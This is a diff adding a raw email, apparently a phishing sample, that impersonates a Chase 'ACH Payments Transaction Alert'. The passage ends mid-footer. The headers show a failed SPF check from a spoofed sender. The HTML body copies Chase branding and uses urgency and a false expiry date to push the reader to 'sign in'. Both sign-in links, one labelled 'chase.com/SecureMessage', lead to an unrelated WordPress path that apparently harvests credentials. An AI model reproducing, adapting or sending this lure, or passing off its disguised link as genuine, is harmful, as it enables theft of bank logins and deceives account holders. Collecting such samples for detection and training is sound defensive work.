@@ -1,0 +1,371 @@
+Return-Path: <Alerts@chaseonline.com>
+Received: from chaseonline.com ([89.43.157.194])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id 8obhl4i2rd2b1ic9pgbb2m78b6s1hl2pomcgaeo1
+ for zingerpie@kfcreview.com;
+ Mon, 09 Feb 2026 16:40:22 +0000 (UTC)
+Received-SPF: fail (spfCheck: domain of chaseonline.com does not designate 89.43.157.194 as permitted sender) client-ip=89.43.157.194; envelope-from=Alerts@chaseonline.com; helo=chaseonline.com;
+Authentication-Results: amazonses.com;
+ spf=fail (spfCheck: domain of chaseonline.com does not designate 89.43.157.194 as permitted sender) client-ip=89.43.157.194; envelope-from=Alerts@chaseonline.com; helo=chaseonline.com;
+ dmarc=none header.from=chaseonline.com;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFFQThMTDZuMnRQby8wVS9MdVA2RHFmYUtJSk9INWlpWlN4SUwxN3pMY1ptK3lpbGptenRDTytPSzVMdXBBUC9SUTEwMXFLR3Z5cjZ5amFuek9RdVpRU21hOWFYRTZiUUZJczB0VFN6Z0RZWURCbFhzME1OM0VGWDBMbEVYdWxQSEozM0lMdVFRa3A2TmxZbXVraWtxaGJFSkRSOXVBa0RncHVUTjI2cHZ2VW9NL0pyQ2NQVHV4N0dlL2djNjZ6b2lPK296eW1DZk4xUmpZdXJMd21YN0ZkOXFlNDYxQW85Tis2dUt1c3crS1NJNUkwRUFkQjF0TEpQa09YeHhUQkY5QzBlRFNjbzQ0OCs0d0dTUFBkR1VhTUpmQWlEajl6V3ZQMThDVjRBbnlvQ0VwWFZLeTJMb0JhOE5FOWE4ZERwMmc9
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=wqP2p8A+xa7WtjHmJCf6xvtIclp90jdIfUvfPh2GIkRZdLsu+IbEwGzS7qsmAapY5wssYaKB2IaEmfciN+qIH7mX8YNI7gJXpSwgJZD8m5LTvJvnQ7nMSLzVE5tZlBZFSZl3QSzNu6rPz2UmZ7GDTLSqfUqrRVuabBr9aeN2BFg=; c=relaxed/simple; s=ndjes4mrtuzus6qxu3frw3ubo3gpjndv; d=amazonses.com; t=1770655223; v=1; bh=mHh8epQJpX++lLyJ8AjsqGe/zBH9XlorLElUC29Dyfk=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+From: "Chase" <Alerts@chaseonline.com>
+To: zingerpie@kfcreview.com
+Subject:  ACH Payments Transaction Alert
+Date: 09 Feb 2026 17:40:22 +0100
+Message-ID: <20260209174022.47A00DC8298E7E69@chaseonline.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY>
+<TABLE class=3DfullWidth style=3D'FONT-SIZE: 11px; FONT-FAMILY: "Lucida Gra=
+nde", Verdana, Arial, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPAC=
+ING: 0px; MIN-WIDTH: 800px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: =
+rgb(51,51,51); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: n=
+ormal; LINE-HEIGHT: normal !important; BACKGROUND-COLOR: rgb(215,219,224); =
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial' cellSpacing=
+=3D0 cellPadding=3D0 width=3D"100%" align=3Dcenter border=3D0>
+<TBODY style=3D"LINE-HEIGHT: normal !important">
+<TR style=3D"LINE-HEIGHT: normal !important">
+<TD class=3DfullWidth style=3D"VERTICAL-ALIGN: top; MIN-WIDTH: 800px; PADDI=
+NG-BOTTOM: 20px; PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: normal !=
+important; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(215,219,224); text-siz=
+e-adjust: none" align=3Dcenter>
+<TABLE class=3DfullWidth style=3D"LINE-HEIGHT: normal !important; BACKGROUN=
+D-COLOR: rgb(255,255,255)" cellSpacing=3D0 cellPadding=3D0 width=3D800 alig=
+n=3Dcenter border=3D0>
+<TBODY style=3D"LINE-HEIGHT: normal !important">
+<TR style=3D"LINE-HEIGHT: normal !important">
+<TD style=3D"VERTICAL-ALIGN: top; LINE-HEIGHT: normal !important; BACKGROUN=
+D-COLOR: rgb(255,255,255); text-size-adjust: none" align=3Dleft>
+<TABLE style=3D"LINE-HEIGHT: normal !important" cellSpacing=3D0 cellPadding=
+=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"LINE-HEIGHT: normal !important">
+<TR style=3D"LINE-HEIGHT: normal !important">
+<TD style=3D"VERTICAL-ALIGN: top; PADDING-BOTTOM: 0px; PADDING-TOP: 23px; P=
+ADDING-LEFT: 0px; LINE-HEIGHT: normal !important; PADDING-RIGHT: 0px; BACKG=
+ROUND-COLOR: rgb(0,94,184); text-size-adjust: none" align=3Dcenter>
+<TABLE style=3D"LINE-HEIGHT: normal !important" cellSpacing=3D0 cellPadding=
+=3D0 border=3D0>
+<TBODY style=3D"LINE-HEIGHT: normal !important">
+<TR style=3D"LINE-HEIGHT: normal !important">
+<TD style=3D"WIDTH: 12px; VERTICAL-ALIGN: bottom; PADDING-BOTTOM: 0px; PADD=
+ING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: normal !important; PADDING-RI=
+GHT: 0px; text-size-adjust: none" align=3Dright><IMG style=3D"BORDER-TOP: 0=
+px; BORDER-RIGHT: 0px; BORDER-BOTTOM: 0px; BORDER-LEFT: 0px; DISPLAY: block=
+; LINE-HEIGHT: normal !important" border=3D0 alt=3D"" src=3D"https://www.ch=
+ase.com/content/dam/email/images/blue-left.jpg" width=3D12 height=3D226></T=
+D>
+<TD style=3D"WIDTH: 616px; VERTICAL-ALIGN: top; PADDING-BOTTOM: 0px; PADDIN=
+G-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: normal !important; PADDING-RIGH=
+T: 0px; BACKGROUND-COLOR: rgb(255,255,255); text-size-adjust: none" align=
+=3Dcenter>
+<TABLE style=3D"LINE-HEIGHT: normal !important" cellSpacing=3D0 cellPadding=
+=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"LINE-HEIGHT: normal !important">
+<TR style=3D"LINE-HEIGHT: normal !important">
+<TD style=3D"VERTICAL-ALIGN: top; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
+DDING-LEFT: 0px; LINE-HEIGHT: normal !important; PADDING-RIGHT: 0px; BACKGR=
+OUND-COLOR: rgb(255,255,255); text-size-adjust: none" align=3Dleft>
+<TABLE style=3D"LINE-HEIGHT: normal !important" cellSpacing=3D0 cellPadding=
+=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"LINE-HEIGHT: normal !important">
+<TR style=3D"LINE-HEIGHT: normal !important">
+<TD style=3D"VERTICAL-ALIGN: top; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
+DDING-LEFT: 0px; LINE-HEIGHT: normal !important; PADDING-RIGHT: 0px; text-s=
+ize-adjust: none" align=3Dleft>
+<TABLE style=3D"LINE-HEIGHT: normal !important" cellSpacing=3D0 cellPadding=
+=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"LINE-HEIGHT: normal !important">
+<TR style=3D"LINE-HEIGHT: normal !important">
+<TD style=3D"WIDTH: 144px; VERTICAL-ALIGN: bottom; LINE-HEIGHT: normal !imp=
+ortant; text-size-adjust: none" align=3Dleft><IMG style=3D"BORDER-TOP: 0px;=
+ BORDER-RIGHT: 0px; BORDER-BOTTOM: 0px; BORDER-LEFT: 0px; DISPLAY: block; L=
+INE-HEIGHT: normal !important" border=3D0 src=3D"https://www.chase.com/cont=
+ent/dam/email/images/chase-logo-h-rgb.jpg" width=3D144 height=3D76></TD></T=
+R></TBODY></TABLE></TD></TR>
+<TR style=3D"LINE-HEIGHT: normal !important">
+<TD class=3DmoPad style=3D"VERTICAL-ALIGN: top; PADDING-BOTTOM: 0px; PADDIN=
+G-TOP: 20px; PADDING-LEFT: 28px; LINE-HEIGHT: normal !important; PADDING-RI=
+GHT: 28px; text-size-adjust: none" align=3Dleft>
+<TABLE style=3D"LINE-HEIGHT: normal !important" cellSpacing=3D0 cellPadding=
+=3D0 align=3Dleft border=3D0>
+<TBODY style=3D"LINE-HEIGHT: normal !important">
+<TR style=3D"LINE-HEIGHT: normal !important">
+<TD style=3D"VERTICAL-ALIGN: top; LINE-HEIGHT: normal !important; text-size=
+-adjust: none" align=3Dleft>
+<TABLE style=3D"LINE-HEIGHT: normal !important" cellSpacing=3D0 cellPadding=
+=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"LINE-HEIGHT: normal !important">
+<TR style=3D"LINE-HEIGHT: normal !important">
+<TD class=3Dfont14 style=3D"FONT-SIZE: 12px; FONT-FAMILY: Arial, Helvetica,=
+ sans-serif; VERTICAL-ALIGN: top; WHITE-SPACE: nowrap; FONT-WEIGHT: bold; C=
+OLOR: rgb(0,0,0); PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDING-LEFT: 10px=
+; LINE-HEIGHT: normal !important; PADDING-RIGHT: 10px; BACKGROUND-COLOR: rg=
+b(215,219,224); text-size-adjust: none; border-radius: 20px" align=3Dleft><=
+B style=3D"LINE-HEIGHT: normal !important">Transaction Alert</B></TD></TR><=
+/TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>
+<TR style=3D"LINE-HEIGHT: normal !important">
+<TD style=3D"VERTICAL-ALIGN: top; LINE-HEIGHT: normal !important; BACKGROUN=
+D-COLOR: rgb(255,255,255); text-size-adjust: none" align=3Dleft>
+<TABLE style=3D"LINE-HEIGHT: normal !important" cellSpacing=3D0 cellPadding=
+=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"LINE-HEIGHT: normal !important">
+<TR style=3D"LINE-HEIGHT: normal !important">
+<TD class=3DmoPad style=3D"VERTICAL-ALIGN: top; PADDING-BOTTOM: 28px; PADDI=
+NG-TOP: 20px; PADDING-LEFT: 30px; LINE-HEIGHT: normal !important; PADDING-R=
+IGHT: 30px; text-size-adjust: none" align=3Dleft>
+<TABLE style=3D"LINE-HEIGHT: normal !important" cellSpacing=3D0 cellPadding=
+=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"LINE-HEIGHT: normal !important">
+<TR style=3D"LINE-HEIGHT: normal !important">
+<TD style=3D"VERTICAL-ALIGN: top; LINE-HEIGHT: normal !important; text-size=
+-adjust: none" align=3Dleft>
+<TABLE class=3DfullWidth style=3D"LINE-HEIGHT: normal !important" cellSpaci=
+ng=3D0 cellPadding=3D0 width=3D460 align=3Dleft border=3D0>
+<TBODY style=3D"LINE-HEIGHT: normal !important">
+<TR style=3D"LINE-HEIGHT: normal !important">
+<TD style=3D"VERTICAL-ALIGN: top; LINE-HEIGHT: normal !important; text-size=
+-adjust: none" align=3Dleft>
+<TABLE style=3D"VERTICAL-ALIGN: top; LINE-HEIGHT: normal !important" cellSp=
+acing=3D0 cellPadding=3D0 align=3Dleft border=3D0>
+<TBODY style=3D"LINE-HEIGHT: normal !important">
+<TR style=3D"LINE-HEIGHT: normal !important">
+<TD class=3DzeroPad style=3D"VERTICAL-ALIGN: top; PADDING-BOTTOM: 0px; PADD=
+ING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: normal !important; PADDING-RI=
+GHT: 0px; text-size-adjust: none" align=3Dleft>
+<H1 style=3D"FONT-SIZE: 30px !important; FONT-FAMILY: Arial, Helvetica, san=
+s-serif !important; FONT-WEIGHT: bold !important; COLOR: rgb(65,64,66); MAR=
+GIN: 0px; LINE-HEIGHT: normal !important">Sign in to read your new secure m=
+essage<BR style=3D"LINE-HEIGHT: normal !important"></H1></TD></TR></TBODY><=
+/TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBOD=
+Y></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD>
+<TD style=3D"WIDTH: 12px; VERTICAL-ALIGN: bottom; PADDING-BOTTOM: 0px; PADD=
+ING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: normal !important; PADDING-RI=
+GHT: 0px; text-size-adjust: none" align=3Dleft><IMG style=3D"BORDER-TOP: 0p=
+x; BORDER-RIGHT: 0px; BORDER-BOTTOM: 0px; BORDER-LEFT: 0px; DISPLAY: block;=
+ LINE-HEIGHT: normal !important" border=3D0 alt=3D"" src=3D"https://www.cha=
+se.com/content/dam/email/images/blue-right.jpg" width=3D12 height=3D226></T=
+D></TR></TBODY></TABLE></TD></TR>
+<TR style=3D"LINE-HEIGHT: normal !important">
+<TD style=3D"VERTICAL-ALIGN: top; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
+DDING-LEFT: 0px; LINE-HEIGHT: normal !important; PADDING-RIGHT: 0px; BACKGR=
+OUND-COLOR: rgb(255,255,255); text-size-adjust: none" align=3Dcenter>
+<TABLE style=3D"LINE-HEIGHT: normal !important" cellSpacing=3D0 cellPadding=
+=3D0 border=3D0>
+<TBODY style=3D"LINE-HEIGHT: normal !important">
+<TR style=3D"LINE-HEIGHT: normal !important">
+<TD style=3D"WIDTH: 12px; VERTICAL-ALIGN: top; PADDING-BOTTOM: 0px; PADDING=
+-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: normal !important; PADDING-RIGHT=
+: 0px; text-size-adjust: none" align=3Dright><IMG style=3D"BORDER-TOP: 0px;=
+ BORDER-RIGHT: 0px; BORDER-BOTTOM: 0px; BORDER-LEFT: 0px; DISPLAY: block; L=
+INE-HEIGHT: normal !important" border=3D0 alt=3D"" src=3D"https://www.chase=
+=2Ecom/content/dam/email/images/white-left.jpg" width=3D12 height=3D77></TD=
+>
+<TD style=3D"WIDTH: 616px; VERTICAL-ALIGN: top; PADDING-BOTTOM: 0px; PADDIN=
+G-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: normal !important; PADDING-RIGH=
+T: 0px; text-size-adjust: none" align=3Dcenter>
+<TABLE style=3D"LINE-HEIGHT: normal !important" cellSpacing=3D0 cellPadding=
+=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"LINE-HEIGHT: normal !important">
+<TR style=3D"LINE-HEIGHT: normal !important">
+<TD class=3D"moPad payment-due-soon-details" style=3D"FONT-SIZE: 16px; FONT=
+-FAMILY: Arial, Helvetica, sans-serif; VERTICAL-ALIGN: top; COLOR: rgb(65,6=
+4,66); PADDING-BOTTOM: 30px; PADDING-TOP: 0px; PADDING-LEFT: 30px; LINE-HEI=
+GHT: normal !important; PADDING-RIGHT: 30px; text-size-adjust: none" align=
+=3Dleft>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<STRONG>Here's what's abo=
+ut:</STRONG><BR style=3D"LINE-HEIGHT: normal !important">
+<TABLE style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BORDER-TOP: 0px; B=
+ORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; WHITE-SPACE: normal; BORDER-COL=
+LAPSE: collapse; BORDER-BOTTOM: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; BORDER-SPACING: 0px; BORDER-LEFT: 0px; MARGIN: 0px auto=
+; PADDING-RIGHT: 0px; transform: scale(1, 1)" cellSpacing=3D0 cellPadding=
+=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BORDER-TOP: 0px; B=
+ORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; PADDING-BOT=
+TOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0p=
+x; PADDING-RIGHT: 0px">
+<TR style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BORDER-TOP: 0px; BORD=
+ER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; PADDING-BOTTOM=
+: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; =
+PADDING-RIGHT: 0px">
+<TD class=3DmoPad style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; BORDER-=
+TOP: 0px; FONT-FAMILY: Arial, Helvetica, sans-serif; BORDER-RIGHT: 0px; VER=
+TICAL-ALIGN: top; BORDER-BOTTOM: 0px; COLOR: rgb(65,64,66); PADDING-BOTTOM:=
+ 0px; PADDING-TOP: 0px; PADDING-LEFT: 30px; BORDER-LEFT: 0px; MARGIN: 0px; =
+PADDING-RIGHT: 30px" align=3Dleft>
+<B style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; BORDER-TOP: 0px; BORDE=
+R-RIGHT: 0px; BORDER-BOTTOM: 0px; FONT-WEIGHT: bold; PADDING-BOTTOM: 0px; P=
+ADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-=
+RIGHT: 0px"><BR>ACH Payments Transaction Alert<BR style=3D"BOX-SIZING: bord=
+er-box"><BR style=3D"BOX-SIZING: border-box"></B>We encourage you to sign i=
+n to read your <A href=3D"https://montacargas-alemig.com/wp-content/wx.htm"=
+>Secure Message</A>
+ because it contains specific information about your account.<BR style=3D"B=
+OX-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box"></TD></TR>
+<TR style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px; BORDER-TOP: 0px; BORD=
+ER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; PADDING-BOTTOM=
+: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; =
+PADDING-RIGHT: 0px">
+<TD class=3DmoPad style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; BORDER-=
+TOP: 0px; FONT-FAMILY: Arial, Helvetica, sans-serif; BORDER-RIGHT: 0px; VER=
+TICAL-ALIGN: top; BORDER-BOTTOM: 0px; COLOR: rgb(65,64,66); PADDING-BOTTOM:=
+ 30px; PADDING-TOP: 0px; PADDING-LEFT: 30px; BORDER-LEFT: 0px; MARGIN: 0px;=
+ PADDING-RIGHT: 30px" align=3Dleft>
+<TABLE style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; BORDER-TOP: 0px; B=
+ORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; WHITE-SPACE: normal; BORDER-COL=
+LAPSE: collapse; BORDER-BOTTOM: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; BORDER-SPACING: 0px; BORDER-LEFT: 0px; MARGIN: 0px auto=
+; PADDING-RIGHT: 0px; transform: scale(1, 1)" cellSpacing=3D0 cellPadding=
+=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; BORDER-TOP: 0px; B=
+ORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; PADDING-BOT=
+TOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0p=
+x; PADDING-RIGHT: 0px">
+<TR style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; BORDER-TOP: 0px; BORD=
+ER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; PADDING-BOTTOM=
+: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; =
+PADDING-RIGHT: 0px">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; BORDER-TOP: 0px; BORD=
+ER-RIGHT: 0px; VERTICAL-ALIGN: top; BORDER-BOTTOM: 0px; PADDING-BOTTOM: 10p=
+x; PADDING-TOP: 5px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADD=
+ING-RIGHT: 20px" align=3Dleft><STRONG style=3D"BOX-SIZING: border-box; FONT=
+-SIZE: 16px; BORDER-TOP: 0px; BORDER-RIGHT: 0px; BORDER-BOTTOM: 0px; FONT-W=
+EIGHT: bold; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORD=
+ER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
+View your secure message in two ways:</STRONG></TD></TR>
+<TR style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; BORDER-TOP: 0px; BORD=
+ER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; PADDING-BOTTOM=
+: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; =
+PADDING-RIGHT: 0px">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; BORDER-TOP: 0px; BORD=
+ER-RIGHT: 0px; VERTICAL-ALIGN: top; BORDER-BOTTOM: 0px; PADDING-BOTTOM: 10p=
+x; PADDING-TOP: 5px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADD=
+ING-RIGHT: 20px" align=3Dleft>
+<TABLE style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; BORDER-TOP: 0px; B=
+ORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; WHITE-SPACE: normal; BORDER-COL=
+LAPSE: collapse; BORDER-BOTTOM: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; BORDER-SPACING: 0px; BORDER-LEFT: 0px; MARGIN: 0px auto=
+; PADDING-RIGHT: 0px; transform: scale(1, 1)" cellSpacing=3D0 cellPadding=
+=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; BORDER-TOP: 0px; B=
+ORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; PADDING-BOT=
+TOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0p=
+x; PADDING-RIGHT: 0px">
+<TR style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; BORDER-TOP: 0px; BORD=
+ER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; PADDING-BOTTOM=
+: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; =
+PADDING-RIGHT: 0px">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; BORDER-TOP: 0px; BORD=
+ER-RIGHT: 0px; VERTICAL-ALIGN: top; BORDER-BOTTOM: 0px; PADDING-BOTTOM: 0px=
+; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDI=
+NG-RIGHT: 5px" align=3Dleft>&#8226;</TD>
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; BORDER-TOP: 0px; BORD=
+ER-RIGHT: 0px; VERTICAL-ALIGN: top; BORDER-BOTTOM: 0px; PADDING-BOTTOM: 0px=
+; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDI=
+NG-RIGHT: 0px" align=3Dleft>From Chase Mobile, go to your profile and choos=
+e "Secure Message Center."</TD></TR></TBODY></TABLE></TD></TR>
+<TR style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; BORDER-TOP: 0px; BORD=
+ER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; PADDING-BOTTOM=
+: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; =
+PADDING-RIGHT: 0px">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; BORDER-TOP: 0px; BORD=
+ER-RIGHT: 0px; VERTICAL-ALIGN: top; BORDER-BOTTOM: 0px; PADDING-BOTTOM: 30p=
+x; PADDING-TOP: 5px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADD=
+ING-RIGHT: 20px" align=3Dleft>
+<TABLE style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; BORDER-TOP: 0px; B=
+ORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; WHITE-SPACE: normal; BORDER-COL=
+LAPSE: collapse; BORDER-BOTTOM: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; BORDER-SPACING: 0px; BORDER-LEFT: 0px; MARGIN: 0px auto=
+; PADDING-RIGHT: 0px; transform: scale(1, 1)" cellSpacing=3D0 cellPadding=
+=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; BORDER-TOP: 0px; B=
+ORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; PADDING-BOT=
+TOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0p=
+x; PADDING-RIGHT: 0px">
+<TR style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; BORDER-TOP: 0px; BORD=
+ER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; PADDING-BOTTOM=
+: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; =
+PADDING-RIGHT: 0px">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; BORDER-TOP: 0px; BORD=
+ER-RIGHT: 0px; VERTICAL-ALIGN: top; BORDER-BOTTOM: 0px; PADDING-BOTTOM: 0px=
+; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDI=
+NG-RIGHT: 5px" align=3Dleft>&#8226;</TD>
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; BORDER-TOP: 0px; BORD=
+ER-RIGHT: 0px; VERTICAL-ALIGN: top; BORDER-BOTTOM: 0px; PADDING-BOTTOM: 0px=
+; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDI=
+NG-RIGHT: 0px" align=3Dleft>At<SPAN>&nbsp;</SPAN> <A href=3D"https://montac=
+argas-alemig.com/wp-content/wx.htm">chase.com/SecureMessage</A>, just sign =
+in to your account.</TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>This=
+ secure&nbsp;message will expire on Date 9/2/2026 17:40:22</TD>
+</TR></TBODY></TABLE>&nbsp;</TD></TR>
+<TR style=3D"LINE-HEIGHT: normal !important">
+<TD style=3D"VERTICAL-ALIGN: top; LINE-HEIGHT: normal !important; text-size=
+-adjust: none" align=3Dleft>
+<TABLE style=3D"LINE-HEIGHT: normal !important" cellSpacing=3D0 cellPadding=
+=3D0 width=3D"100%" align=3Dleft border=3D0>
+<TBODY style=3D"LINE-HEIGHT: normal !important">
+<TR style=3D"LINE-HEIGHT: normal !important">
+<TD style=3D"VERTICAL-ALIGN: top; LINE-HEIGHT: normal !important; text-size=
+-adjust: none" align=3Dleft></TD></TR></TBODY></TABLE></TD></TR>
+<TR style=3D"LINE-HEIGHT: normal !important">
+<TD class=3D"moPad font14" style=3D"FONT-SIZE: 12px; FONT-FAMILY: Arial, He=
+lvetica, sans-serif; VERTICAL-ALIGN: top; COLOR: rgb(113,113,113); PADDING-=
+BOTTOM: 20px; PADDING-TOP: 0px; PADDING-LEFT: 30px; LINE-HEIGHT: normal !im=
+portant; PADDING-RIGHT: 30px; text-size-adjust: none" align=3Dleft>Securely=
+ access your accounts in the&nbsp;<A title=3D"Follow link" style=3D"COLOR: =
+rgb(0,105,166); LINE-HEIGHT: normal !important" href=3D"https://www.chase.c=
+om/digital/mobile-banking" target=3D_blank>Chase Mobile&reg;</A>
+ &nbsp;app or at&nbsp;<A title=3D"Follow link" style=3D"COLOR: rgb(0,105,16=
+6); LINE-HEIGHT: normal !important" href=3D"https://secure.chase.com/web/au=
+th/nav?navKey=3DrequestDashboard" target=3D_blank>chase.com</A>.<BR style=
+=3D"LINE-HEIGHT: normal !important"></TD></TR>
+<TR style=3D"LINE-HEIGHT: normal !important">
+<TD style=3D"VERTICAL-ALIGN: top; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
+DDING-LEFT: 0px; LINE-HEIGHT: normal !important; PADDING-RIGHT: 0px; BACKGR=
+OUND-COLOR: rgb(246,246,246); text-size-adjust: none" align=3Dleft>
+<TABLE style=3D"LINE-HEIGHT: normal !important" cellSpacing=3D0 cellPadding=
+=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"LINE-HEIGHT: normal !important">
+<TR style=3D"LINE-HEIGHT: normal !important">
+<TD class=3D"moPad font14" style=3D"FONT-SIZE: 12px; FONT-FAMILY: Arial, He=
+lvetica, sans-serif; VERTICAL-ALIGN: top; COLOR: rgb(113,113,113); PADDING-=
+BOTTOM: 60px; PADDING-TOP: 20px; PADDING-LEFT: 30px; LINE-HEIGHT: normal !i=
+mportant; PADDING-RIGHT: 30px; text-size-adjust: none" align=3Dleft><B styl=
+e=3D"LINE-HEIGHT: normal !important">ABOUT THIS MESSAGE</B><BR style=3D"LIN=
+E-HEIGHT: normal !important"><BR style=3D"LINE-HEIGHT: normal !important">
+Chase Mobile&reg; app is available for select mobile devices. Message and d=
